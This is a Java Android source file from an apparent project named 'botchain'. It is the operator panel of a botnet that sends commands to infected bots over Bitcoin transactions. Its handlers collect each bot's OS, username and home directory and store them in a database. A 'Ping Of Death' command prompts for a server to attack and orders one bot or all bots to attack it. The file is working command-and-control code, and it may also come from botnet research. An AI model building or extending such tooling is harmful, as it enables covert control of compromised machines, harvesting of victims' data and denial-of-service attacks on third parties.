package com.example.tonipagliaro.botchain;

import android.app.AlertDialog;
import android.content.DialogInterface;
import android.content.Intent;
import android.os.Bundle;
import android.support.v7.app.AppCompatActivity;
import android.util.Log;
import android.view.Menu;
import android.view.MenuItem;
import android.view.View;
import android.widget.AdapterView;
import android.widget.Button;
import android.widget.EditText;
import android.widget.ListView;

import com.example.tonipagliaro.botchain.Adapter.BotListAdapter;

import org.bitcoinj.core.Address;
import org.bitcoinj.core.Coin;
import org.bitcoinj.core.Transaction;
import org.bitcoinj.wallet.Wallet;
import org.bitcoinj.wallet.listeners.WalletCoinsReceivedEventListener;

import java.util.ArrayList;

public class BotListActivity extends AppCompatActivity {

    static ApplicationState appState;

    BotListAdapter listaBotAdapter;

    ArrayList<String> indirizzi=new ArrayList<String>();

    ListView listView;
    Button buttonRestart;
    Button buttonBroadcast;
    Button buttonWallet;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_bot_list);

        appState = (ApplicationState) getApplication();

        listView = (ListView) this.findViewById(R.id.listView_bot);

        for(String s : appState.mappaIndirizzi.keySet()){
            indirizzi.add(s+"-"+appState.mappaIndirizzi.get(s));
        }

        listaBotAdapter = new BotListAdapter(this, R.layout.list_item, indirizzi);
        listView.setAdapter(listaBotAdapter);

        listView.setOnItemClickListener(new AdapterView.OnItemClickListener() {
            @Override
            public void onItemClick(AdapterView<?> parent, View view, final int position, long id) {
                AlertDialog.Builder builder = new AlertDialog.Builder(BotListActivity.this);

                builder.setTitle(R.string.title_command_dialog)
                        .setItems(R.array.command_list, new DialogInterface.OnClickListener() {
                            public void onClick(DialogInterface dialog, int which) {
                                try {
                                    ListView lw = ((AlertDialog)dialog).getListView();
                                    Log.d("App", lw.getItemAtPosition(which).toString());
                                    final String botAddress = listView.getItemAtPosition(position).toString().split("-")[0];
                                    String command = lw.getItemAtPosition(which).toString();
                                    if (appState.mappaIndirizzi.get(botAddress).equalsIgnoreCase(appState.BOT_STATE_ONLINE) ||
                                            appState.mappaIndirizzi.get(botAddress).equalsIgnoreCase(appState.BOT_STATE_START)) {
                                        switch (command) {
                                            case ("Get OS"):
                                                appState.sendCommand("os-" + appState.wallet.currentReceiveKey().toAddress(appState.params).toString(),
                                                        new Address(appState.params, botAddress));
                                                setBotStateQuest(botAddress);
                                                break;
                                            case ("Get Username"):
                                                appState.sendCommand("username-" + appState.wallet.currentReceiveKey().toAddress(appState.params).toString(),
                                                        new Address(appState.params, botAddress));
                                                setBotStateQuest(botAddress);
                                                break;
                                            case ("Get User Home"):
                                                appState.sendCommand("userhome-" + appState.wallet.currentReceiveKey().toAddress(appState.params).toString(),
                                                        new Address(appState.params, botAddress));
                                                setBotStateQuest(botAddress);
                                                break;
                                            case ("Ping Of Death"):
                                                AlertDialog.Builder builder = new AlertDialog.Builder(BotListActivity.this);
                                                builder.setMessage("Choose server to attack");
                                                builder.setCancelable(false);

                                                //final TextView textViewPingOfDeath = new TextView(BotListActivity.this);
                                                final EditText editTextPingOfDeath = new EditText(BotListActivity.this);
                                                //builder.setView(textViewPingOfDeath);
                                                builder.setView(editTextPingOfDeath);

                                                builder.setPositiveButton("Ok", new DialogInterface.OnClickListener() {
                                                    public void onClick(DialogInterface dialog, int id) {
                                                        String addressToAttack = editTextPingOfDeath.getText().toString();
                                                        if (!addressToAttack.equalsIgnoreCase("")) {
                                                            try {
                                                                appState.sendCommand("pingOfDeath-" + appState.wallet.currentReceiveKey().toAddress(appState.params).toString()
                                                                                + "-"+addressToAttack,
                                                                        new Address(appState.params, botAddress));
                                                                setBotStateQuest(botAddress);
                                                            } catch (Exception e) {
                                                                e.printStackTrace();
                                                            }
                                                        }
                                                    }
                                                })

                                                        .setNegativeButton("Cancel", new DialogInterface.OnClickListener() {
                                                            public void onClick(DialogInterface dialog, int id) {
                                                                dialog.cancel();
                                                            }
                                                        });
                                                AlertDialog alert = builder.create();
                                                alert.show();
                                                break;

                                            default:
                                                break;
                                        }
                                    }

                                } catch (Exception e) {
                                    e.printStackTrace();
                                }
                            }
                        });
                builder.create().show();
            }
        });

        buttonRestart = (Button) this.findViewById(R.id.button_refresh);
        buttonRestart.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                //Inviamo il comando solo ai bot che hanno lo stato "ok"
                try {
                    appState.sendCommand("restart-" + appState.wallet.currentReceiveKey().toAddress(appState.params).toString());
                } catch (Exception e) {
                    e.printStackTrace();
                }
                //Aggiorna lo stato dei bot in "no"
                setStatoBots(appState.getBotStateOnlineString(), appState.BOT_STATE_OFFLINE);
            }
        });

        //Per il momento lo manda a tutti.............
        buttonBroadcast = (Button) this.findViewById(R.id.button_broadcast);
        buttonBroadcast.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                AlertDialog.Builder builder = new AlertDialog.Builder(BotListActivity.this);
                builder.setTitle(R.string.title_command_dialog)
                        .setItems(R.array.command_list, new DialogInterface.OnClickListener() {
                            public void onClick(DialogInterface dialog, int which) {
                                try {
                                    ListView lw = ((AlertDialog)dialog).getListView();
                                    Log.d("App", lw.getItemAtPosition(which).toString());
                                    String command = lw.getItemAtPosition(which).toString();
                                    switch (command) {
                                        case ("Get OS"):
                                            appState.sendCommand("os-" + appState.wallet.currentReceiveKey().toAddress(appState.params).toString());
                                            setStatoBots(appState.getBotStateOnlineString(), appState.BOT_STATE_QUEST);
                                            break;
                                        case ("Get Username"):
                                            appState.sendCommand("username-" + appState.wallet.currentReceiveKey().toAddress(appState.params).toString());
                                            setStatoBots(appState.getBotStateOnlineString(), appState.BOT_STATE_QUEST);
                                            break;
                                        case ("Get User Home"):
                                            appState.sendCommand("userhome-" + appState.wallet.currentReceiveKey().toAddress(appState.params).toString());
                                            setStatoBots(appState.getBotStateOnlineString(), appState.BOT_STATE_QUEST);
                                            break;
                                        case ("Ping Of Death"):
                                            AlertDialog.Builder builder = new AlertDialog.Builder(BotListActivity.this);
                                            builder.setMessage("Choose server to attack");
                                            builder.setCancelable(false);

                                            //final TextView textViewPingOfDeath = new TextView(BotListActivity.this);
                                            final EditText editTextPingOfDeath = new EditText(BotListActivity.this);
                                            //builder.setView(textViewPingOfDeath);
                                            builder.setView(editTextPingOfDeath);

                                            builder.setPositiveButton("Ok", new DialogInterface.OnClickListener() {
                                                public void onClick(DialogInterface dialog, int id) {
                                                    String addressToAttack = editTextPingOfDeath.getText().toString();
                                                    if (!addressToAttack.equalsIgnoreCase("")) {
                                                        try {
                                                            appState.sendCommand("pingOfDeath-" + appState.wallet.currentReceiveKey().toAddress(appState.params).toString()
                                                                    + "-"+addressToAttack);
                                                            setStatoBots(appState.getBotStateOnlineString(), appState.BOT_STATE_QUEST);
                                                        } catch (Exception e) {
                                                            e.printStackTrace();
                                                        }
                                                    }
                                                }
                                            })

                                                    .setNegativeButton("No", new DialogInterface.OnClickListener() {
                                                        public void onClick(DialogInterface dialog, int id) {
                                                            dialog.cancel();
                                                        }
                                                    });
                                            AlertDialog alert = builder.create();
                                            alert.show();
                                            break;
                                        default:
                                            break;
                                        }
                                } catch (Exception e) {
                                    e.printStackTrace();
                                }
                            }
                        });
                builder.create().show();
            }
        });

        buttonWallet = (Button) this.findViewById(R.id.button_wallet);
        buttonWallet.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                Intent intent = new Intent(BotListActivity.this, WalletActivity.class);
                startActivity(intent);
            }
        });

        appState.wallet.addCoinsReceivedEventListener(new WalletCoinsReceivedEventListener() {
            @Override
            public void onCoinsReceived(Wallet wallet, Transaction tx, Coin prevBalance, Coin newBalance) {
                Coin value = tx.getValueSentToMe(wallet);
                try {
                    String mess = appState.readOpReturn(tx);

                    String[] v = mess.split("-");
                    String comando = v[0];

                    Log.d("App", "comando: " + comando);

                    String addressString = v[1];

                    Log.d("App", "address:" + addressString);

                    String balance = "";

                    if (appState.hasMapAddress(addressString)) {
                        switch (comando) {
                            case ("os_ok"):
                                setBotStateOnline(addressString);
                                String os = v[2];
                                balance = v[3];
                                appState.db.updateBalance(addressString, balance);
                                appState.db.updateOs(addressString, os);
                                //appState.writeQuestFile("SISTEMA OPERATIV BOT: " + os);
                                Log.d("App", "SISTEMA OPERATIV BOT: " + os);
                                break;
                            case ("ping_ok"):
                                setBotStateOnline(addressString);
                                balance = v[2];
                                appState.db.updateBalance(addressString, balance);
                                for (String s : appState.mappaIndirizzi.keySet()) {
                                    Log.d("App", "indirizzo " + s + " valore " + appState.mappaIndirizzi.get(s));
                                }
                                break;
                            case ("username_ok"):
                                setBotStateOnline(addressString);
                                String username = v[2];
                                balance = v[3];
                                appState.db.updateBalance(addressString, balance);
                                appState.db.updateUsername(addressString, username);
                                //appState.writeQuestFile("SISTEMA OPERATIV BOT: " + username);
                                Log.d("App", "SISTEMA OPERATIV BOT: " + username);
                                break;
                            case ("userhome_ok"):
                                setBotStateOnline(addressString);
                                String userhome = v[2];
                                balance = v[3];
                                appState.db.updateBalance(addressString, balance);
                                appState.db.updateUserHome(addressString, userhome);
                                Log.d("App", "USERHOME BOT: " + userhome);
                                break;
                            case ("pingOfDeath_ok"):
                                setBotStateOnline(addressString);
                                String pingOfDeath = v[2];
                                balance = v[3];
                                appState.db.updateBalance(addressString, balance);
                                appState.db.updatePingOfDeath(addressString, pingOfDeath);
                                Log.d("App", "PING OF DEATH BOT: " + pingOfDeath);
                                break;
                            case ("restart_ok"):
                                setBotStateStart(addressString);
                                balance = v[3];
                                appState.db.updateBalance(addressString, balance);
                                break;
                            default:
                                break;
                        }
                    }
                } catch (Exception e) {
                    e.printStackTrace();
                }
            }
        });

        //Evento per la lunga pressione di un elemento della lista
        listView.setOnItemLongClickListener(new AdapterView.OnItemLongClickListener() {
            @Override
            public boolean onItemLongClick(AdapterView<?> parent, View view, int position, long id) {
                //RIchiamare la activity Quest
                String botAddress = listView.getItemAtPosition(position).toString().split("-")[0];
                Intent intent = new Intent(BotListActivity.this, QuestActivity.class);
                intent.putExtra("bot", botAddress);
                startActivity(intent);
                return false;
            }
        });

    }


    public void setBotStateOnline(String address) {
        appState.mappaIndirizzi.put(address, appState.BOT_STATE_ONLINE);
        appState.saveMappaIndirizzi();
        indirizzi.clear();
        for(String s : appState.mappaIndirizzi.keySet()){
            indirizzi.add(s + "-" + appState.mappaIndirizzi.get(s));
        }
        runOnUiThread(new Runnable() {
            @Override
            public void run() {
                listaBotAdapter.notifyDataSetChanged();
            }
        });
    }

    public void setBotStateStart(String address) {
        appState.mappaIndirizzi.put(address, appState.BOT_STATE_START);
        appState.saveMappaIndirizzi();
        indirizzi.clear();
        for(String s : appState.mappaIndirizzi.keySet()){
            indirizzi.add(s + "-" + appState.mappaIndirizzi.get(s));
        }
        runOnUiThread(new Runnable() {
            @Override
            public void run() {
                listaBotAdapter.notifyDataSetChanged();
            }
        });
    }

    public void setBotStateQuest(String address) {
        appState.mappaIndirizzi.put(address, appState.BOT_STATE_QUEST);
        appState.saveMappaIndirizzi();
        indirizzi.clear();
        for(String s : appState.mappaIndirizzi.keySet()){
            indirizzi.add(s + "-" + appState.mappaIndirizzi.get(s));
        }
        runOnUiThread(new Runnable() {
            @Override
            public void run() {
                listaBotAdapter.notifyDataSetChanged();
            }
        });
    }

    public void setStatoBots(ArrayList<String> addressList, String state) {
        appState.setStatoBots(addressList, state);
        indirizzi.clear();
        for(String s : appState.mappaIndirizzi.keySet()){
            indirizzi.add(s +"-" +appState.mappaIndirizzi.get(s));
        }
        runOnUiThread(new Runnable() {
            @Override
            public void run() {
                listaBotAdapter.notifyDataSetChanged();
            }
        });
    }

/*
    public static String readOpReturn(Transaction tx) throws Exception {
        List<TransactionOutput> ti = tx.getOutputs();
        String mess="";
        Address from = null;
        for (TransactionOutput t : ti) {
            Script script = t.getScriptPubKey();

            //prelievo dell'indirizzo
            if (t.getAddressFromP2PKHScript(appState.wallet.getParams()) != null) {
                from = t.getAddressFromP2PKHScript(appState.wallet.getParams());
            }


            if (script.isOpReturn()) {
                byte[] message = new byte[script.getProgram().length-2];

                System.arraycopy(script.getProgram(), 2, message, 0, script.getProgram().length - 2);

                mess = new String(message);
                Log.d("App", "Op_return   " + mess);
            }

        }
        return mess;
    }
*/


    @Override
    public boolean onCreateOptionsMenu(Menu menu) {
        // Inflate the menu; this adds items to the action bar if it is present.
        getMenuInflater().inflate(R.menu.menu_main, menu);
        return true;
    }

    @Override
    public boolean onOptionsItemSelected(MenuItem item) {
        // Handle action bar item clicks here. The action bar will
        // automatically handle clicks on the Home/Up button, so long
        // as you specify a parent activity in AndroidManifest.xml.
        int id = item.getItemId();

        //noinspection SimplifiableIfStatement
        if (id == R.id.action_settings) {
            return true;
        }

        return super.onOptionsItemSelected(item);
    }


}
